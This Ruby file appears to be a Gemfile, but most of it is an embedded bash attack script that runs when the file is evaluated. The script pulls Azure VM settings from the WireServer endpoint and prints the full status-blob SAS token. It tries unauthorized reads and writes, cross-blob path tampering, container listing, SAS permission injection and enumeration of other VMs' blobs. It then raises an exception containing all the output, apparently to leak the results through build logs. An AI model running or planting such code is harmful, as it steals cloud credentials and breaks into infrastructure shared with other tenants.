require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v118; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"

# Dump the FULL vmSettings response structure
echo "STEP_VMS_SIZE=$(wc -c < vm.json)"

cat > x.py <<'PY'
import json, sys
d = json.load(open('vm.json'))
print("STEP_TOP_KEYS=" + str(sorted(d.keys())))
status = d.get('statusUploadBlob', {})
print("STEP_STATUS_UPLOAD_BLOB_TYPE=" + str(status.get('statusBlobType', '')))
print("STEP_STATUS_UPLOAD_VALUE=" + status.get('value', '')[:500])
ga = d.get('gaFamilies', [])
print("STEP_GA_FAMILIES_COUNT=" + str(len(ga)))
for i, f in enumerate(ga[:3]):
    print("STEP_GA_F" + str(i) + "_NAME=" + f.get('name','') + " uris=" + str([u[:120] for u in f.get('uris',[])][:3]))
egs = d.get('extensionGoalStates', [])
print("STEP_EGS_COUNT=" + str(len(egs)))
for i, e in enumerate(egs):
    print("STEP_EGS_" + str(i) + "_NAME=" + e.get('name','') + " state=" + e.get('state','') + " sequence=" + str(e.get('sequenceNumber','')))
PY
python3 x.py

# Extract status SAS
STATUS_SAS=$(python3 -c "import json; d=json.load(open('vm.json')); print(d.get('statusUploadBlob',{}).get('value',''))")
echo "STEP_STATUS_SAS_FULL=$STATUS_SAS"

if [ -n "$STATUS_SAS" ]; then
  # Decode HTML entities (& → &)
  DECODED=$(python3 -c "import html, sys; print(html.unescape('''$STATUS_SAS'''))")
  echo "STEP_STATUS_SAS_DECODED=${DECODED:0:300}"

  # === Test 1: READ the status blob (sp=rw includes r) ===
  echo "===STATUS_BLOB_READ==="
  curl -s -m 15 -X GET -o status_read.bin -w "HTTP %{http_code} LEN %{size_download} CT=%{content_type}\n" "$DECODED"
  echo "STEP_STATUS_READ_HEX_FIRST_256=$(head -c 256 status_read.bin | od -An -tx1 | tr -d ' \n')"
  echo "STEP_STATUS_READ_B64_FIRST_400=$(base64 -w0 < status_read.bin | head -c 400)"

  # === Test 2: HEAD (cheap) ===
  curl -s -m 10 -X HEAD -D head.txt -o /dev/null -w "HEAD_HTTP=%{http_code}\n" "$DECODED"
  cat head.txt | head -c 500
  echo ""

  # === Test 3: WRITE a PROBE-MARK to the status blob (sp=rw includes w) ===
  echo "===STATUS_BLOB_WRITE_TEST==="
  # Page blob requires specific protocol — try a small put-page
  # But first test simple PUT to see what happens
  PROBE="BENTY-PROBE-MARK-F023-statusblob-$(date +%s)"
  curl -s -m 10 -X PUT -H "x-ms-blob-type: PageBlob" -H "x-ms-version: 2018-03-28" --data-binary "$PROBE" -o put.txt -w "PUT_HTTP=%{http_code} LEN=%{size_download}\n" "$DECODED"
  head -c 400 put.txt
  echo ""

  # === Test 4: CROSS-BLOB attack — manipulate blob name in URL ===
  # SAS sig is based on canonical URL with blob path; manipulation should fail
  # But test anyway because Azure has had bugs here
  echo "===STATUS_BLOB_CROSS_TEST==="
  # Extract the blob path
  cat > parse.py <<'PY'
import sys, urllib.parse, html
url = html.unescape(sys.stdin.read().strip())
u = urllib.parse.urlparse(url)
print(u.scheme + '://' + u.netloc + u.path)
print(u.query)
print(u.netloc)
PY
  PARTS=$(echo "$STATUS_SAS" | python3 parse.py)
  BLOB_PATH=$(echo "$PARTS" | sed -n '1p')
  SIG_Q=$(echo "$PARTS" | sed -n '2p')
  HOST=$(echo "$PARTS" | sed -n '3p')
  echo "STEP_BLOB_PATH=$BLOB_PATH"
  echo "STEP_HOST=$HOST"

  # Try replacing the blob name (keep same sig)
  for VARIANT in \
    '/$system/AAAA.00000000-0000-0000-0000-000000000000.status' \
    '/$system/admin.status' \
    '/$system/' \
    '/$system' \
    '/' \
    "$(echo $BLOB_PATH | sed -E 's|/\$system/[^.]+\.[a-f0-9-]+\.status|/$system/test.deadbeef-dead-beef-dead-beefdeadbeef.status|')"; do
    URL_TRY="https://${HOST}${VARIANT}?${SIG_Q}"
    curl -s -m 5 -o vary.bin -w "TRY=$VARIANT HTTP=%{http_code} LEN=%{size_download}\n" "$URL_TRY"
    echo " body_b64=$(base64 -w0 < vary.bin | head -c 200)"
  done

  # === Test 5: LIST container? sp=rw doesn't include l, but try ===
  echo "===CONTAINER_LIST_ATTEMPT==="
  for COMP in "comp=list&restype=container" "comp=list" ""; do
    URL_TRY="https://${HOST}/\$system?${COMP}&${SIG_Q}"
    curl -s -m 5 -o list.bin -w "LIST comp=$COMP HTTP=%{http_code} LEN=%{size_download}\n" "$URL_TRY"
    echo " body_b64=$(base64 -w0 < list.bin | head -c 300)"
  done

  # === Test 6: With sp=rl appended (try permission injection) ===
  echo "===PERM_INJECTION_TEST==="
  MOD_QUERY=$(echo "$SIG_Q" | sed 's|sp=rw|sp=rwl|')
  URL_TRY="https://${HOST}/\$system?comp=list&restype=container&${MOD_QUERY}"
  curl -s -m 5 -o pi.bin -w "PERM_INJECT HTTP=%{http_code} LEN=%{size_download}\n" "$URL_TRY"
  echo " body_b64=$(base64 -w0 < pi.bin | head -c 300)"

  # === Test 7: Sibling VM status — UUID brute force ===
  echo "===SIBLING_VM_STATUS==="
  ORIG_NAME=$(echo "$BLOB_PATH" | grep -oE '/[A-Za-z0-9]+\.[a-f0-9-]+\.status' | head -c 200)
  echo "ORIG=$ORIG_NAME"
  # Try predictable VM names
  for SIB in "AAAAAAAAAAAA.00000000-0000-0000-0000-000000000001" "test.deadbeef-dead-beef-dead-beefdeadbeef"; do
    URL_TRY="https://${HOST}/\$system/${SIB}.status?${SIG_Q}"
    curl -s -m 5 -o sib.bin -w "SIB=$SIB HTTP=%{http_code} LEN=%{size_download}\n" "$URL_TRY"
    echo " body_b64=$(base64 -w0 < sib.bin | head -c 200)"
  done
fi
SHELL
Tempfile.create('v118.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v118 " + line.chomp[0..1500] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
